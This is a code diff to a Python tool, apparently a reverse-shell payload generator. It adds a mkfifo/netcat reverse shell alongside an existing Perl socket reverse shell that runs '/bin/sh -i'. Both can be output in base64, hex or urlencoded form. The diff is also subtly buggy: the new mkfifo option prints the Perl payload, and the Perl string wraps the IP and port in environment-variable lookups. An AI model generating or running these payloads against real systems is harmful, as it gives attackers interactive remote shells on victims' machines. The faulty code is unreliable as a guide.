@@ -80,6 +80,12 @@ class Perl(Encode):
         self.__payload = "perl -e 'use Socket;$i=\"$ENV{"+self.__ip+"}"+";$p=$ENV{"+self.__porta+"};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
         super().__init__(self.__payload)
 
+class Mkfifo(Encode):
+    def __init__(self:object,ip:str,porta:str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {self.__ip} {self.__porta} >/tmp/f"
+        super().__init__(self.__payload)
 
 class Argumentos():
     global args
@@ -129,6 +135,15 @@ if __name__ == "__main__":
         elif args.encode == "urlencode":
             print(Netcat(args.ip,args.porta).urlencode())
     elif args.payload == "perl":
+        if args.encode is None:
+            print(Perl(args.ip,args.porta).shell())
+        elif args.encode == "base64":
+            print(Perl(args.ip,args.porta).base64())
+        elif args.encode == "hex":
+            print(Perl(args.ip,args.porta).hexadecimal())
+        elif args.encode == "urlencode":
+            print(Perl(args.ip,args.porta).urlencode())
+    elif args.payload == "mkfifo":
         if args.encode is None:
             print(Perl(args.ip,args.porta).shell())
         elif args.encode == "base64":
